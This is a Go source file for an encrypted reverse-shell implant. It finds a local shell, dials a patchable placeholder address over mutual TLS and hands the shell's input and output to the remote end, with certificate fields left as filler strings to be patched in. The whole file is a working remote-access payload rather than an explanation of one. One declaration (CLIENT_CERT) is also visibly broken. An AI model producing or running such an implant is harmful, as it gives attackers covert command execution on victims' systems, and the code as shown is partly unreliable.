package main

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log"
	"os/exec"
	"strings"
)

var shellList = []string{"sh", "bash", "ash", "zsh"}
var dirList = []string{"/bin", "/usr/bin", "/usr/local/bin"}

func findShell() string {
	for _, sh := range shellList {
		shPath, err := exec.LookPath(sh)
		if err == nil {
			return shPath
		}
	}

	for _, dir := range dirList {
		for _, sh := range shellList {
			shPath, err := exec.LookPath(fmt.Sprintf("%v/%v", dir, sh))
			if err == nil {
				return shPath
			}
		}
	}

	return "no-shell"
}

// The string must be longer than the longest possible connect address
// PATCH_CONNECT_ADDR_HERE
// 127.127.127.127:65535
const CONNECT_ADDR = "PATCH_CONNECT_ADDR_HERE"

var SERVER_CERT []byte = []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
var CLIENT_CERT []byte = []byte
var CLIENT_KEY []byte = []byte("CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC")

func main() {
	log.Println("Locating shell")
	cmd := exec.Command(findShell())

	// Load client certificate and key
	cert, err := tls.X509KeyPair(CLIENT_CERT, CLIENT_KEY)
	if err != nil {
		log.Fatalf("failed to load client key pair: %v", err)
	}

	// Create a certificate pool for the CA
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(SERVER_CERT)

	// Create TLS config
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		InsecureSkipVerify: false,
	}

	conn, err := tls.Dial("tcp", strings.Trim(CONNECT_ADDR, " "), tlsConfig)
	if err != nil {
		log.Fatalf("failed to connect: %v", err)
	}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	log.Println("Running shell")

	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	log.Println("Shell finished")
}
